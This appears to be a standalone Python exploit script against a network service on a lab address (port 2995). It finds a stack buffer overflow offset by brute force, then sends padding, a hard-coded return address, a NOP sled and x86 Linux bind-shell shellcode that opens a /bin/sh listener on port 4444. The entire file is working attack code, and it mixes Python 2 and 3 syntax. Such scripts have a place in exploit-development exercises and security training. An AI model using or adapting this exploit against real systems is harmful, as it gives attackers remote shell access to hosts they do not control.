import socket
import sys

def main():

	HOST = '192.168.56.101'
	PORT = 2995

	# Find offset
	i = 0
	while(1):

	    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	    sock.connect((HOST, PORT))
	    data = "a"*512 + "b"*i  + "\n"
	    offset = i
	    sock.send(data.encode())

	    data = sock.recv(2048)
	    data.decode("utf-8")
	    if(not data.startswith("No".encode())):
	        print "Offset from buffer to return address is: ", str(offset+512)
	        sock.close()
	        break
	    sock.recv(1024)
	    sock.close()
	    i += 1

	# Make shellcode
	shellcode =  ""
	shellcode += "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66"
	shellcode += "\xcd\x80\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51"
	shellcode += "\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04"
	shellcode += "\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f"
	shellcode += "\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f"
	shellcode += "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

	# Connect to victim
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((HOST, PORT))

	# Construct full exploit
	nopsled = "\x90"*20
	data = "a" * (offset + 512) + "\x74\xfc\xff\xbf" + nopsled * 20 + shellcode + "\n"


	sock.send(bytearray(data))
	print("Data sent successfully!")
	data = sock.recv(2048)
	print(data.decode())
	sock.close()

if __name__ == "__main__":
	main()
